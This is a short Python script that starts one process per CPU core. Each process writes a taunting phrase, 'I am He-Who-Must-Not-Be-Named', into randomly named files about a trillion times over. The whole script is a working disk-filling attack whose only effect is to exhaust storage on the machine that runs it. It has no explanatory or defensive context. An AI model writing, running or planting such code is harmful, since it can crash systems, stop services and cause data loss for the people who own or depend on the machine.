from multiprocessing import Process,cpu_count
import random
cores = cpu_count()
def fill_space1():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space2():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space3():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space4():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space5():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space6():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space7():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space8():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space9():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space10():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space11():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space12():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space13():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space14():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space15():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space16():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space17():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space18():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space19():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space20():
    name = 'file' + str(random.randint(0,1000000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def Main():
    p1 = Process(target=fill_space1)
    p2 = Process(target=fill_space2)
    p3 = Process(target=fill_space3)
    p4 = Process(target=fill_space4)
    p5 = Process(target=fill_space5)
    p6 = Process(target=fill_space6)
    p7 = Process(target=fill_space7)
    p8 = Process(target=fill_space8)
    p9 = Process(target=fill_space9)
    p10 = Process(target=fill_space10)
    p11 = Process(target=fill_space11)
    p12 = Process(target=fill_space12)
    p13 = Process(target=fill_space13)
    p14 = Process(target=fill_space14)
    p15 = Process(target=fill_space15)
    p16 = Process(target=fill_space16)
    p17 = Process(target=fill_space17)
    p18 = Process(target=fill_space18)
    p19 = Process(target=fill_space19)
    p20 = Process(target=fill_space20)
    processes =  {'0':p1,'1':p2,'2':p3,'3':p4,'4':p5,'5':p6,'6':p7,'7':p8,'8':p9,'9':p10,'10':p11,'11':p12,'12':p13,'13':p14,'14':p15,'15':p16,'16':p17,'17':p18,'18':p19,'19':p20}
    for i in range(cores):
        processes[str(i)].start()
    for i in range(cores):
        processes[str(i)].join()
if __name__=='__main__':
    Main()